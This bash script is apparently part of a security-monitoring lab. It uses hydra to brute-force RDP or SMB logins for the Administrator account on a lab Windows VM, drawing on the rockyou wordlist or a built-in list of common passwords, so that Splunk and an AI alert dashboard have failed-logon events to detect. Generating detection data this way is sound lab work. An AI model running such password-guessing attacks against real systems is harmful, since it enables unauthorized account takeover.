#!/usr/bin/env bash
# =====================================================================
# Kali demo — generates a brute-force pattern against the Windows victim VM.
# This produces Windows Security 4625 events that Sysmon + Splunk UF
# forward into Splunk Enterprise. The SOC AI poller picks them up.
#
# Edit TARGET_IP and PROTOCOL before running.
# Requires: hydra (apt install hydra) on Kali.
# =====================================================================

set -euo pipefail

TARGET_IP="${TARGET_IP:-192.168.56.20}"   # Windows VM IP
TARGET_USER="${TARGET_USER:-Administrator}"
PROTOCOL="${PROTOCOL:-rdp}"               # rdp | smb
WORDLIST="${WORDLIST:-/usr/share/wordlists/rockyou.txt}"
ATTEMPTS="${ATTEMPTS:-30}"

if ! command -v hydra >/dev/null 2>&1; then
  echo "[!] hydra not installed. Run: sudo apt install -y hydra" >&2
  exit 1
fi

if [[ ! -f "$WORDLIST" ]]; then
  echo "[!] Wordlist $WORDLIST not found. Using built-in tiny list."
  WORDLIST=$(mktemp)
  printf "Password1\nadmin\nletmein\n123456\nP@ssw0rd\nWelcome1\nQwerty123\n" > "$WORDLIST"
fi

echo "[+] Brute-forcing $PROTOCOL://$TARGET_IP as $TARGET_USER (~$ATTEMPTS attempts)"
case "$PROTOCOL" in
  rdp) hydra -t 4 -V -f -l "$TARGET_USER" -P "$WORDLIST" "rdp://$TARGET_IP" -W 5 || true ;;
  smb) hydra -t 4 -V -f -l "$TARGET_USER" -P "$WORDLIST" "smb://$TARGET_IP"      || true ;;
  *) echo "[!] Unknown protocol: $PROTOCOL"; exit 2 ;;
esac

echo "[+] Done. Watch the SOC AI dashboard at http://<your-laptop>:5173 for the resulting alerts."
